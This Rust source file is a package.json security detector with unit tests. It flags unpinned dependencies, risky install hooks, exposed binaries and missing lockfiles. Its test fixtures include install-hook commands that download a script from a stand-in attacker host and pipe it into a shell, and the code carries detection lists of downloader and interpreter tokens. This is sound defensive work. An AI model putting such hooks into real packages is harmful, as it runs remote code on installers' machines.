//! `package.json` manifest detector: unpinned-dep findings, install
//! lifecycle hooks (with risky-shell escalation), exposed `bin` field,
//! and missing-lockfile reporting based on `packageManager`.

use serde_json::Value;
use std::path::{Path, PathBuf};

use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_orchestration::network::extract_http_urls;
use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};

use super::NPM_INSTALL_HOOKS;

const INSTALL_HOOK_NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
const INSTALL_HOOK_EXEC_COMMAND_ARGS: &[(&str, &str)] = &[
    ("bash", "-c"),
    ("sh", "-c"),
    ("python", "-c"),
    ("node", "-e"),
];

pub(crate) fn analyze_package_json(
    service: &ArtifactOrchestratorService,
    path: &Path,
    content: &str,
    sibling_files: &[PathBuf],
) -> Vec<Finding> {
    let artifact_path = path.display().to_string();
    let json = match serde_json::from_str::<Value>(content) {
        Ok(value) => value,
        Err(err) => return vec![package_json_parse_failure_finding(&artifact_path, &err)],
    };

    let mut findings = Vec::new();

    // Suppress unpinned dep findings when a lockfile exists, since the
    // lockfile pins exact versions regardless of the version specifier.
    let has_lockfile = package_json_expected_lockfiles(content)
        .iter()
        .any(|lockfile| {
            crate::services::artifact_orchestration::manifests::sibling_has_file(
                sibling_files,
                lockfile,
            )
        });

    for dependency_field in ["dependencies", "devDependencies", "optionalDependencies"] {
        let Some(dependencies) = json.get(dependency_field).and_then(Value::as_object) else {
            continue;
        };

        for (name, version) in dependencies {
            let Some(version_str) = version.as_str() else {
                continue;
            };

            if !has_lockfile && is_unpinned_npm_version(version_str) {
                findings.push(
                    Finding::builder(
                        "MANIFEST_PACKAGE_JSON_UNPINNED_DEP",
                        ThreatCategory::SupplyChain,
                    )
                    .severity(Severity::Low)
                    .action(RecommendedAction::Log)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{name}@{version_str}"))
                    .reason("Manifest dependency is not strictly pinned")
                    .build(),
                );
            }
        }
    }

    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        for hook in NPM_INSTALL_HOOKS {
            if let Some(command) = scripts.get(*hook).and_then(Value::as_str) {
                let risky_install_hook = package_json_install_hook_is_risky(command);
                findings.push(
                    Finding::builder(
                        "MANIFEST_PACKAGE_JSON_INSTALL_HOOK",
                        ThreatCategory::SupplyChain,
                    )
                    .severity(if risky_install_hook {
                        Severity::Medium
                    } else {
                        Severity::Low
                    })
                    .action(if risky_install_hook {
                        RecommendedAction::RequireApproval
                    } else {
                        RecommendedAction::Log
                    })
                    .evidence_kind(if risky_install_hook {
                        EvidenceKind::Behavior
                    } else {
                        EvidenceKind::Context
                    })
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{hook}: {command}"))
                    .reason(if risky_install_hook {
                        "Manifest defines an install lifecycle hook that fetches or executes code"
                    } else {
                        "Manifest defines an install lifecycle hook"
                    })
                    .build(),
                );
            }
        }
    }

    if package_json_bin_is_exposed(&json) {
        findings.push(
            Finding::builder(
                "MANIFEST_PACKAGE_JSON_BIN_EXPOSED",
                ThreatCategory::ScopeCreep,
            )
            .severity(Severity::Low)
            .action(RecommendedAction::Log)
            .evidence_kind(EvidenceKind::Context)
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.clone(),
            })
            .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
            .match_value("bin")
            .reason("Manifest exposes executable binaries")
            .build(),
        );
    }

    let expected_lockfiles = package_json_expected_lockfiles(content);
    if !expected_lockfiles.is_empty() {
        findings.extend(service.missing_lockfile_findings(
            path,
            sibling_files,
            &expected_lockfiles,
            "MANIFEST_PACKAGE_JSON_MISSING_LOCKFILE",
            "JavaScript manifest has no matching nearby lockfile",
        ));
    }

    findings
}

pub(crate) fn package_json_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };

    let mut capabilities = Vec::new();
    let mut has_install_hook = false;
    let mut has_network_hook = false;

    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        for hook in NPM_INSTALL_HOOKS {
            let Some(command) = scripts.get(*hook).and_then(Value::as_str) else {
                continue;
            };
            has_install_hook = true;
            has_network_hook |= package_json_install_hook_has_network(command);
        }

        if has_install_hook {
            capabilities.push(ArtifactOrchestratorService::declared_capability(
                ArtifactCapability::InstallExecution,
            ));
            capabilities.push(ArtifactOrchestratorService::declared_capability(
                ArtifactCapability::ProcessExecution,
            ));
        }
        if has_network_hook {
            capabilities.push(ArtifactOrchestratorService::observed_capability(
                ArtifactCapability::NetworkAccess,
            ));
        }
    }

    if package_json_bin_is_exposed(&json) {
        capabilities.push(ArtifactOrchestratorService::declared_capability(
            ArtifactCapability::ExposesBinary,
        ));
    }

    capabilities
}

fn package_json_install_hook_is_risky(command: &str) -> bool {
    let lower_command = command.to_ascii_lowercase();
    package_json_install_hook_has_network(command)
        || lower_command
            .lines()
            .any(|line| command_token_with_boundary(line, "powershell"))
        || lower_command.lines().any(|line| {
            INSTALL_HOOK_EXEC_COMMAND_ARGS
                .iter()
                .any(|(command, arg)| command_token_followed_by_arg(line, command, arg))
        })
}

fn package_json_install_hook_has_network(command: &str) -> bool {
    let lower_command = command.to_ascii_lowercase();
    lower_command.lines().any(|line| {
        INSTALL_HOOK_NETWORK_COMMAND_TOKENS
            .iter()
            .any(|token| command_token_with_boundary(line, token))
    }) || lower_command.contains("http://")
        || lower_command.contains("https://")
}

fn command_token_with_boundary(line: &str, token: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = line[start..].find(token) {
        let abs_pos = start + pos;
        let token_end = abs_pos + token.len();
        let before = if abs_pos > 0 {
            line.as_bytes().get(abs_pos - 1)
        } else {
            None
        };
        let left_ok = before.is_none()
            || matches!(
                before,
                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
            );
        let after = line.get(token_end..).unwrap_or("");
        let right_ok = after.is_empty()
            || after.starts_with(' ')
            || after.starts_with('\t')
            || after.starts_with('|')
            || after.starts_with(';')
            || after.starts_with('&')
            || after.starts_with('>')
            || after.starts_with('<');
        if left_ok && right_ok {
            return true;
        }
        start = token_end;
    }
    false
}

fn command_token_followed_by_arg(line: &str, command: &str, arg: &str) -> bool {
    let mut tokens =
        line.split(|c: char| c.is_ascii_whitespace() || matches!(c, '|' | ';' | '&' | '('));
    while let Some(token) = tokens.next() {
        let basename = token.rsplit(['/', '\\']).next().unwrap_or(token);
        if basename == command {
            return tokens.any(|candidate| candidate.trim_end_matches([';', '|', '&', ')']) == arg);
        }
    }
    false
}

/// Whether a `package.json` dependency version specifier is anything
/// other than a strictly-pinned exact SemVer version.
///
/// npm accepts ranges, arbitrary dist-tags, URL/protocol sources, aliases,
/// workspace references, and repository shorthands. Those all resolve to a
/// floating or externally mutable source at install time, so the only
/// non-unpinned shapes are exact SemVer pins such as `1.2.3`,
/// `1.2.3-alpha.1`, `1.2.3+build.1`, and `=1.2.3`.
fn is_unpinned_npm_version(version: &str) -> bool {
    let trimmed = version.trim();
    if trimmed.is_empty() {
        return true;
    }
    !is_exact_npm_version_pin(trimmed)
}

fn is_exact_npm_version_pin(version: &str) -> bool {
    let version = version.strip_prefix('=').unwrap_or(version);
    let (without_build, build) = split_once_optional(version, '+');
    if build.is_some_and(|value| !is_valid_semver_identifier_list(value)) {
        return false;
    }
    let (core, prerelease) = split_once_optional(without_build, '-');
    if prerelease.is_some_and(|value| !is_valid_semver_identifier_list(value)) {
        return false;
    }
    let mut parts = core.split('.');
    let Some(major) = parts.next() else {
        return false;
    };
    let Some(minor) = parts.next() else {
        return false;
    };
    let Some(patch) = parts.next() else {
        return false;
    };
    parts.next().is_none()
        && [major, minor, patch]
            .iter()
            .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
}

fn split_once_optional(value: &str, delimiter: char) -> (&str, Option<&str>) {
    value
        .split_once(delimiter)
        .map_or((value, None), |(left, right)| (left, Some(right)))
}

fn is_valid_semver_identifier_list(value: &str) -> bool {
    !value.is_empty()
        && value.split('.').all(|part| {
            !part.is_empty()
                && part
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        })
}

/// A `package.json` whose body fails to parse is suspicious on its own:
/// the rest of the analysis pipeline (install hooks, bin exposure,
/// lockfile expectations, dependency pinning) silently drops it for lack
/// of structure, and an attacker can intentionally craft "almost valid"
/// JSON to bypass every package-json detector. Emit an explicit finding
/// so the manifest's existence — and our inability to analyze it — is
/// recorded in the audit output instead of being swallowed. Mirrors the
/// contract pinned by `MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE` in
/// `detectors/manifests/container/compose/detectors.rs`.
fn package_json_parse_failure_finding(artifact_path: &str, err: &serde_json::Error) -> Finding {
    Finding::builder(
        "MANIFEST_PACKAGE_JSON_PARSE_FAILURE",
        ThreatCategory::Generic,
    )
    .severity(Severity::Low)
    .action(RecommendedAction::Log)
    .evidence_kind(EvidenceKind::Context)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::PackageManifest,
        Some(artifact_path.to_string()),
    )
    .match_value(err.to_string())
    .reason(
        "package.json manifest is not valid JSON; install-hook, bin-exposure \
         and dependency analyses cannot run against this file",
    )
    .build()
}

/// Whether `package.json`'s `bin` field exposes at least one executable.
///
/// npm only honors `bin` as a non-empty string (single binary named after the
/// package) or a non-empty object (`{name -> path}` map). `null`, `""`, `{}`,
/// `[]`, or any other shape is a no-op for npm and must NOT contribute the
/// `ExposesBinary` capability or fire `MANIFEST_PACKAGE_JSON_BIN_EXPOSED` —
/// otherwise an empty placeholder field falsely escalates the package via the
/// `install_binary` capability combo (`findings/summary.rs:345`).
fn package_json_bin_is_exposed(json: &Value) -> bool {
    match json.get("bin") {
        // Whitespace-only strings are normalised away by npm at install
        // time, so they expose nothing — pre-fix `!s.is_empty()` treated
        // `"   "` as a real binary and falsely escalated the package.
        Some(Value::String(s)) => !s.trim().is_empty(),
        Some(Value::Object(map)) => !map.is_empty(),
        _ => false,
    }
}

pub(crate) fn package_json_expected_lockfiles(content: &str) -> Vec<&'static str> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };

    let package_manager = json
        .get("packageManager")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_ascii_lowercase();

    if package_manager.starts_with("pnpm@") {
        return vec!["pnpm-lock.yaml"];
    }
    if package_manager.starts_with("yarn@") {
        return vec!["yarn.lock"];
    }
    if package_manager.starts_with("npm@") {
        return vec!["package-lock.json", "npm-shrinkwrap.json"];
    }

    vec![
        "package-lock.json",
        "npm-shrinkwrap.json",
        "yarn.lock",
        "pnpm-lock.yaml",
    ]
}

pub(crate) fn package_json_relations(content: &str) -> Vec<ArtifactLink> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };
    let mut links = Vec::new();
    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        for hook in NPM_INSTALL_HOOKS {
            if let Some(command) = scripts.get(*hook).and_then(Value::as_str) {
                links.push(ArtifactLink {
                    target: command.to_string(),
                    relation: ArtifactRelation::Executes,
                });
                if package_json_install_hook_has_network(command) {
                    let urls = extract_http_urls(command);
                    if urls.is_empty() {
                        links.push(ArtifactLink {
                            target: "remote-resource".to_string(),
                            relation: ArtifactRelation::Downloads,
                        });
                    } else {
                        links.extend(urls.into_iter().map(|url| ArtifactLink {
                            target: url,
                            relation: ArtifactRelation::Downloads,
                        }));
                    }
                }
            }
        }
    }
    links
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn finding_present(findings: &[Finding], rule_id: &str) -> bool {
        findings.iter().any(|finding| finding.rule_id == rule_id)
    }

    fn download_relation_target_present(links: &[ArtifactLink], target: &str) -> bool {
        links.iter().any(|link| {
            matches!(link.relation, ArtifactRelation::Downloads) && link.target == target
        })
    }

    /// Contract: `bin: null` carries no executable; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_null_value() {
        let manifest = r#"{"name":"pkg","bin":null}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: `bin: ""` carries no executable path; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_empty_string() {
        let manifest = r#"{"name":"pkg","bin":""}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: `bin: {}` declares no binaries; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_empty_object() {
        let manifest = r#"{"name":"pkg","bin":{}}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: a non-empty string `bin` exposes one executable named after the package;
    /// capability and finding must fire (positive case to pin the happy path).
    #[test]
    fn package_json_bin_capability_fires_for_string_path() {
        let manifest = r#"{"name":"pkg","bin":"./cli.js"}"#;
        let caps = package_json_capabilities(manifest);
        assert!(capability_present(&caps, ArtifactCapability::ExposesBinary));
    }

    /// Contract: a non-empty object `bin` exposes one or more named executables;
    /// capability and finding must fire.
    #[test]
    fn package_json_bin_capability_fires_for_non_empty_object() {
        let manifest = r#"{"name":"pkg","bin":{"foo":"./foo.js"}}"#;
        let caps = package_json_capabilities(manifest);
        assert!(capability_present(&caps, ArtifactCapability::ExposesBinary));
    }

    /// Contract: the BIN_EXPOSED finding mirrors the capability — empty values
    /// are skipped, non-empty values fire.
    #[test]
    fn package_json_bin_finding_skips_empty_object_and_fires_for_real_value() {
        let empty = r#"{"name":"pkg","bin":{}}"#;
        let real = r#"{"name":"pkg","bin":"./cli.js"}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let empty_findings = analyze_package_json(&service, path, empty, &[]);
        let real_findings = analyze_package_json(&service, path, real, &[]);
        assert!(!finding_present(
            &empty_findings,
            "MANIFEST_PACKAGE_JSON_BIN_EXPOSED"
        ));
        assert!(finding_present(
            &real_findings,
            "MANIFEST_PACKAGE_JSON_BIN_EXPOSED"
        ));
    }

    /// Contract: `analyze_package_json` flags a `prepare` install hook
    /// as risky when its command runs `curl ... | bash`. `prepare`
    /// runs on `npm install` (no args, dev mode) and before
    /// `npm publish` / `npm pack`, so it ships arbitrary code with the
    /// same automatic-execution semantics as `preinstall`/`postinstall`.
    /// The pre-fix loop covered only the three classic hooks.
    #[test]
    fn analyze_package_json_detects_prepare_hook_with_curl() {
        let manifest =
            r#"{"name":"x","scripts":{"prepare":"curl http://attacker.example/p.sh | bash"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);
        let install_hook_finding = findings
            .iter()
            .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
            .expect("prepare hook with curl must raise an install-hook finding");
        assert_eq!(install_hook_finding.severity, Severity::Medium);
        assert_eq!(
            install_hook_finding.recommended_action,
            RecommendedAction::RequireApproval,
        );
        assert!(install_hook_finding.match_value.starts_with("prepare:"));
    }

    /// Contract: `package_json_capabilities` flips `InstallExecution`
    /// and `ProcessExecution` for any of the auto-running hooks,
    /// including `prepare` / `prepublishOnly` / `postpublish`.
    #[test]
    fn package_json_capabilities_fires_for_prepare_and_prepublish_hooks() {
        for hook in ["prepare", "prepublishOnly", "postpublish"] {
            let manifest = format!(r#"{{"name":"x","scripts":{{"{hook}":"echo hi"}}}}"#);
            let caps = package_json_capabilities(&manifest);
            assert!(
                capability_present(&caps, ArtifactCapability::InstallExecution),
                "hook `{hook}` must declare InstallExecution",
            );
            assert!(
                capability_present(&caps, ArtifactCapability::ProcessExecution),
                "hook `{hook}` must declare ProcessExecution",
            );
        }
    }

    /// Contract: install hooks that fetch over HTTP(S) carry network
    /// behavior in the artifact graph, not only execution behavior.
    #[test]
    fn package_json_capabilities_adds_network_for_fetching_install_hook() {
        let manifest =
            r#"{"name":"x","scripts":{"postinstall":"curl HTTPS://attacker.example/p.sh | sh"}}"#;

        let caps = package_json_capabilities(manifest);

        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
    }

    /// # Contract
    ///
    /// Install-hook network command detection is token-boundary aware.
    /// Tab-separated and absolute-path downloader invocations with
    /// variable-sourced URLs still carry network behavior.
    #[test]
    fn package_json_capabilities_adds_network_for_boundary_download_hook() {
        for command in [
            "curl\t$PAYLOAD_URL | sh",
            "/usr/bin/wget\t$PAYLOAD_URL -O payload.sh",
            "iwr\t$PAYLOAD_URL -OutFile payload.ps1",
        ] {
            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
            let caps = package_json_capabilities(&manifest);

            assert!(
                capability_present(&caps, ArtifactCapability::NetworkAccess),
                "boundary-separated downloader must raise NetworkAccess for {command:?}; got {caps:?}",
            );
        }
    }

    /// Contract: a plain install hook is execution, not network access.
    #[test]
    fn package_json_capabilities_skips_network_for_plain_install_hook() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"node bootstrap.js"}}"#;

        let caps = package_json_capabilities(manifest);

        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// # Contract (negative)
    ///
    /// Downloader matching must not fire on command-name substrings.
    #[test]
    fn package_json_capabilities_rejects_download_command_substrings() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"mycurl\t$PAYLOAD_URL"}}"#;

        let caps = package_json_capabilities(manifest);

        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// Contract: install-hook URLs become Downloads edges for taint and
    /// capability-combo analysis.
    #[test]
    fn package_json_relations_records_download_urls_for_fetching_install_hook() {
        let manifest =
            r#"{"name":"x","scripts":{"postinstall":"curl HTTPS://attacker.example/p.sh | sh"}}"#;

        let links = package_json_relations(manifest);

        assert!(download_relation_target_present(
            &links,
            "HTTPS://attacker.example/p.sh"
        ));
    }

    /// # Contract
    ///
    /// Variable-sourced downloader hooks do not expose a literal URL, but
    /// they still create a remote-resource Downloads edge for taint and
    /// capability-combo analysis.
    #[test]
    fn package_json_relations_records_remote_resource_for_boundary_download_hook() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;

        let links = package_json_relations(manifest);

        assert!(download_relation_target_present(&links, "remote-resource"));
    }

    /// Contract: plain install hooks do not invent Downloads edges.
    #[test]
    fn package_json_relations_skips_download_for_plain_install_hook() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"node bootstrap.js"}}"#;

        let links = package_json_relations(manifest);

        assert!(!links
            .iter()
            .any(|link| matches!(link.relation, ArtifactRelation::Downloads)));
    }

    /// # Contract (negative)
    ///
    /// Lookalike downloader command names must not invent Downloads edges.
    #[test]
    fn package_json_relations_rejects_download_command_substrings() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"mycurl\t$PAYLOAD_URL"}}"#;

        let links = package_json_relations(manifest);

        assert!(!links
            .iter()
            .any(|link| matches!(link.relation, ArtifactRelation::Downloads)));
    }

    /// # Contract
    ///
    /// A variable-sourced downloader in an install hook is risky even when
    /// the command does not contain a literal URL.
    #[test]
    fn analyze_package_json_marks_boundary_download_hook_risky() {
        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);

        let install_hook_finding = findings
            .iter()
            .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
            .expect("postinstall hook must raise an install-hook finding");
        assert_eq!(install_hook_finding.severity, Severity::Medium);
        assert_eq!(
            install_hook_finding.recommended_action,
            RecommendedAction::RequireApproval,
        );
    }

    /// # Contract
    ///
    /// Interpreter install hooks with tab-separated flags are risky execution
    /// hooks, the same as their space-separated forms.
    #[test]
    fn analyze_package_json_marks_tab_separated_exec_hook_risky() {
        for command in [
            "bash\t-c ./install.sh",
            "sh\t-c ./install.sh",
            "python\t-c 'import os'",
            "node\t-e 'require(\"./install\")'",
        ] {
            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
            let path = std::path::Path::new("/pkg/package.json");
            let service = ArtifactOrchestratorService::new();
            let findings = analyze_package_json(&service, path, &manifest, &[]);

            let install_hook_finding = findings
                .iter()
                .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
                .expect("postinstall hook must raise an install-hook finding");
            assert_eq!(
                install_hook_finding.severity,
                Severity::Medium,
                "{command:?} must be a risky install hook",
            );
            assert_eq!(
                install_hook_finding.recommended_action,
                RecommendedAction::RequireApproval,
                "{command:?} must require approval",
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Interpreter install-hook risk matching is command-token aware.
    #[test]
    fn analyze_package_json_rejects_exec_hook_command_substrings() {
        for command in [
            "rebash\t-c ./install.sh",
            "wash\t-c ./install.sh",
            "mypython\t-c 'import os'",
            "denode\t-e 'require(\"./install\")'",
        ] {
            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
            let path = std::path::Path::new("/pkg/package.json");
            let service = ArtifactOrchestratorService::new();
            let findings = analyze_package_json(&service, path, &manifest, &[]);

            let install_hook_finding = findings
                .iter()
                .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
                .expect("postinstall hook must raise an install-hook finding");
            assert_eq!(
                install_hook_finding.severity,
                Severity::Low,
                "{command:?} must remain a plain install hook",
            );
            assert_eq!(
                install_hook_finding.recommended_action,
                RecommendedAction::Log,
                "{command:?} must not require approval",
            );
        }
    }

    /// Contract: a `bin` field that is whitespace-only is a no-op for npm
    /// (npm normalises it away), so it MUST NOT contribute the
    /// `ExposesBinary` capability. Pre-fix `!s.is_empty()` accepted `"   "`
    /// as a real binary and falsely escalated the package via the
    /// `install_binary` capability combo.
    #[test]
    fn package_json_capabilities_rejects_whitespace_only_bin() {
        for bin_value in ["\"   \"", "\"\\t\"", "\"\\n\""] {
            let manifest = format!(r#"{{"name":"x","bin":{bin_value}}}"#);
            let caps = package_json_capabilities(&manifest);
            assert!(
                !capability_present(&caps, ArtifactCapability::ExposesBinary),
                "bin={bin_value} (whitespace-only) must not expose binary; got {caps:?}",
            );
        }
    }

    /// Contract: a real `bin` path MUST still flip `ExposesBinary`.
    /// Positive-case regression guard so the trim fix doesn't accidentally
    /// suppress legitimate bin declarations.
    #[test]
    fn package_json_capabilities_accepts_real_bin_path() {
        let manifest = r#"{"name":"x","bin":"./cli.js"}"#;
        let caps = package_json_capabilities(manifest);
        assert!(
            capability_present(&caps, ArtifactCapability::ExposesBinary),
            "real bin path must expose binary; got {caps:?}",
        );
    }

    /// Contract: a `package.json` whose body fails to parse MUST emit
    /// `MANIFEST_PACKAGE_JSON_PARSE_FAILURE`. Pre-fix the function silently
    /// returned `Vec::new()`, so an attacker could ship intentionally-broken
    /// JSON to suppress every install-hook / bin-exposure / dependency
    /// detector without any audit trail. Mirrors the contract pinned by
    /// `analyze_docker_compose_emits_parse_failure_finding_for_invalid_yaml`.
    #[test]
    fn analyze_package_json_emits_parse_failure_finding_for_invalid_json() {
        // Trailing comma is unambiguous JSON syntax error in serde_json.
        let bad = r#"{"name":"pkg","scripts":{"prepare":"x",}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, bad, &[]);
        assert!(
            finding_present(&findings, "MANIFEST_PACKAGE_JSON_PARSE_FAILURE"),
            "invalid JSON must produce a parse-failure finding; got {findings:?}",
        );
        let only_parse_failure = findings
            .iter()
            .all(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_PARSE_FAILURE");
        assert!(
            only_parse_failure,
            "no other detector should fire on invalid JSON; got {findings:?}",
        );
    }

    /// Contract: a valid `package.json` MUST NOT produce a parse-failure
    /// finding. Negative case for the parse-failure detector.
    #[test]
    fn analyze_package_json_does_not_emit_parse_failure_for_valid_json() {
        let good = r#"{"name":"pkg","dependencies":{"a":"1.2.3"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, good, &[]);
        assert!(
            !finding_present(&findings, "MANIFEST_PACKAGE_JSON_PARSE_FAILURE"),
            "valid JSON must not produce a parse-failure finding; got {findings:?}",
        );
    }

    /// Contract: `is_unpinned_npm_version` MUST classify every npm
    /// version specifier that resolves to a floating set or mutable
    /// external source as unpinned.
    #[test]
    fn is_unpinned_npm_version_classifies_all_floating_shapes() {
        let unpinned = [
            "",
            "*",
            "latest",
            "next",
            "beta",
            "canary",
            "^1.0.0",
            "~1.0.0",
            ">=1.0.0",
            "<2.0.0",
            ">1.0.0",
            "1.0.0 || 2.0.0",
            "1.0.0 - 2.0.0",
            "git+https://github.com/x/y.git",
            "Git+HTTPS://github.com/x/y.git",
            "git://github.com/x/y.git",
            "file:../local/pkg",
            "link:../sibling",
            "http://example.com/pkg.tgz",
            "https://example.com/pkg.tgz",
            "workspace:*",
            "npm:lodash@4.17.21",
            "github:user/repo",
        ];
        for spec in unpinned {
            assert!(
                is_unpinned_npm_version(spec),
                "{spec:?} must classify as unpinned",
            );
        }
    }

    /// Contract: a strictly-pinned exact-version specifier MUST NOT
    /// classify as unpinned. Negative case so a future tightening of
    /// the helper does not accidentally start flagging real pins.
    #[test]
    fn is_unpinned_npm_version_does_not_classify_exact_pins() {
        let pinned = [
            "1.0.0",
            "1.2.3",
            "0.0.1-alpha.1",
            "1.2.3+build.1",
            "1.2.3-beta.1+build.5",
            "=1.0.0",
        ];
        for spec in pinned {
            assert!(
                !is_unpinned_npm_version(spec),
                "{spec:?} must NOT classify as unpinned",
            );
        }
    }

    /// Contract: arbitrary npm dist-tags are not exact version pins and
    /// MUST raise `MANIFEST_PACKAGE_JSON_UNPINNED_DEP`.
    #[test]
    fn analyze_package_json_flags_dist_tag_as_unpinned() {
        let manifest = r#"{"name":"x","dependencies":{"react":"next"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);
        assert!(
            finding_present(&findings, "MANIFEST_PACKAGE_JSON_UNPINNED_DEP"),
            "dist-tag dependency must fire UNPINNED_DEP; got {findings:?}",
        );
    }

    /// Contract: exact SemVer pins still suppress
    /// `MANIFEST_PACKAGE_JSON_UNPINNED_DEP`.
    #[test]
    fn analyze_package_json_keeps_exact_semver_pin_clean() {
        let manifest = r#"{"name":"x","dependencies":{"react":"18.2.0"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);
        assert!(
            !finding_present(&findings, "MANIFEST_PACKAGE_JSON_UNPINNED_DEP"),
            "exact SemVer pin must not fire UNPINNED_DEP; got {findings:?}",
        );
    }

    /// Contract: an empty version string in `dependencies` MUST raise
    /// `MANIFEST_PACKAGE_JSON_UNPINNED_DEP`. Pre-fix `""` slipped past
    /// the `^/~/latest/*` check despite npm resolving it to `*`. End-
    /// to-end pin against `analyze_package_json` so a future refactor
    /// can't silently drop the helper's coverage.
    #[test]
    fn analyze_package_json_flags_empty_version_as_unpinned() {
        let manifest = r#"{"name":"x","dependencies":{"a":""}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);
        assert!(
            finding_present(&findings, "MANIFEST_PACKAGE_JSON_UNPINNED_DEP"),
            "empty version must fire UNPINNED_DEP; got {findings:?}",
        );
    }
}
